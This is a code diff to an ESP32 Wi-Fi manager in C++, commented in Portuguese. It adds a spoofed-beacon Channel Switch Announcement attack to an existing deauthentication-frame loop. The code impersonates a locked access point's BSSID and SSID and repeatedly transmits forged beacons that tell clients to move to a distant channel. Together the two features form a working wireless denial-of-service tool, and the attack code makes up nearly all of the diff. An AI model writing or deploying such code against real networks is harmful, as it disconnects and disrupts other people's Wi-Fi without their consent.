@@ -1,10 +1,13 @@
 #include "wifi_manager.h"
 #include "deauth_frame_builder.h"
+#include "csa_beacon_builder.h"
 #include <esp_wifi.h>
 #include <cstring>
 #include <cstdio>
 
-static const int kLoopFramesPerTick = 4;  // frames por tick do loop de deauth
+static const int kLoopFramesPerTick = 4;    // frames por tick do loop de deauth
+static const int kCsaFramesPerTick = 3;     // beacons CSA por tick
+static const uint8_t kCsaSwitchCount = 1;   // beacons anunciados ate a troca de canal
 
 void WifiManager::begin() {
   WiFi.mode(WIFI_STA);
@@ -17,6 +20,7 @@ void WifiManager::begin() {
 
 int WifiManager::scan() {
   stopDeauthLoop();
+  stopCsaAttack();
   stopSniff();  // senao o radio fica preso no canal antigo, promiscuo, mas "esquecido" no estado
   int n = WiFi.scanNetworks();
   count_ = n > 0 ? n : 0;
@@ -76,6 +80,7 @@ int WifiManager::indexForSsid(const String &ssid) const {
 
 bool WifiManager::connect(const String &ssid, const String &pass, uint32_t timeoutMs) {
   stopDeauthLoop();
+  stopCsaAttack();
   stopSniff();
   WiFi.disconnect();
   state_ = WifiState::CONNECTING;
@@ -91,6 +96,7 @@ bool WifiManager::connect(const String &ssid, const String &pass, uint32_t timeo
 
 void WifiManager::disconnect() {
   stopDeauthLoop();
+  stopCsaAttack();
   WiFi.disconnect();
   state_ = WifiState::IDLE;
 }
@@ -98,6 +104,7 @@ void WifiManager::disconnect() {
 bool WifiManager::lockChannel(int index) {
   if (!validIndex(index, count_)) return false;
   stopDeauthLoop();
+  stopCsaAttack();
   stopSniff();
   uint8_t *b = WiFi.BSSID(index - 1);
   if (!b) return false;
@@ -119,6 +126,7 @@ String WifiManager::lockedBssidString() const {
 
 void WifiManager::unlock() {
   stopDeauthLoop();
+  stopCsaAttack();
   stopSniff();
   state_ = WifiState::IDLE;
 }
@@ -197,6 +205,7 @@ bool WifiManager::startDeauthLoop(const String &target, uint16_t reason,
   uint8_t mac[6];
   if (!parseMac(target, mac)) return false;
 
+  stopCsaAttack();  // deauth loop e CSA sao exclusivos (os dois mexem no promiscuo)
   stopSniff();  // o loop cuida do promiscuo sozinho, sem callback de RX
   memcpy(loopTarget_, mac, 6);
   loopReason_ = reason;
@@ -229,16 +238,62 @@ String WifiManager::deauthLoopTargetString() const {
   return String(buf);
 }
 
-void WifiManager::tick() {
-  if (!deauthLoopActive_) return;
-  if (millis() - lastLoopSend_ < loopIntervalMs_) return;
-  lastLoopSend_ = millis();
+bool WifiManager::startCsaAttack(uint8_t newChannel, uint32_t intervalMs) {
+  if (state_ != WifiState::LOCKED && state_ != WifiState::SNIFFING) return false;
 
-  uint8_t frame[26];
-  DeauthFrameBuilder::build(loopTarget_, lockedBssid_, loopReason_, frame, loopFc0_);
-  for (int i = 0; i < kLoopFramesPerTick; i++) {
-    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true) == ESP_OK) loopSentTotal_++;
-    delay(1);
+  stopDeauthLoop();  // exclusivos
+  stopSniff();       // o CSA cuida do promiscuo sozinho
+
+  if (newChannel == 0) newChannel = (lockedChannel_ >= 7) ? 1 : 11;  // canal longe do atual
+  csaNewChannel_ = newChannel;
+  csaIntervalMs_ = intervalMs < 20 ? 20 : intervalMs;
+  csaSentTotal_ = 0;
+  lastCsaSend_ = 0;
+
+  // o beacon tem que sair no canal onde os clientes estao escutando (o do AP)
+  esp_wifi_set_channel((uint8_t)lockedChannel_, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_ps(WIFI_PS_NONE);
+  esp_wifi_set_promiscuous(true);  // fica ligado o ataque todo pra drenar a fila de TX
+  csaActive_ = true;
+  Serial.printf("[csa] iniciado: bssid=%s ssid=%s canal_atual=%d -> canal_novo=%u intervalo=%ums\n",
+                lockedBssidString().c_str(), lockedSsid_.c_str(), lockedChannel_,
+                (unsigned)csaNewChannel_, (unsigned)csaIntervalMs_);
+  return true;
+}
+
+void WifiManager::stopCsaAttack() {
+  if (!csaActive_) return;
+  csaActive_ = false;
+  esp_wifi_set_promiscuous(false);
+  Serial.printf("[csa] parado: %u beacons enviados no total\n", (unsigned)csaSentTotal_);
+}
+
+void WifiManager::tick() {
+  // Loop de deauth (um frame de 26 bytes por envio)
+  if (deauthLoopActive_) {
+    if (millis() - lastLoopSend_ < loopIntervalMs_) return;
+    lastLoopSend_ = millis();
+    uint8_t frame[26];
+    DeauthFrameBuilder::build(loopTarget_, lockedBssid_, loopReason_, frame, loopFc0_);
+    for (int i = 0; i < kLoopFramesPerTick; i++) {
+      if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true) == ESP_OK) loopSentTotal_++;
+      delay(1);
+    }
+    return;
+  }
+
+  // Ataque CSA (beacon spoofado com Channel Switch Announcement)
+  if (csaActive_) {
+    if (millis() - lastCsaSend_ < csaIntervalMs_) return;
+    lastCsaSend_ = millis();
+    uint8_t frame[128];
+    size_t len = CsaBeaconBuilder::build(lockedBssid_, lockedSsid_, (uint8_t)lockedChannel_,
+                                         csaNewChannel_, kCsaSwitchCount, frame, sizeof(frame));
+    if (len == 0) return;
+    for (int i = 0; i < kCsaFramesPerTick; i++) {
+      if (esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true) == ESP_OK) csaSentTotal_++;
+      delay(1);
+    }
   }
 }
 
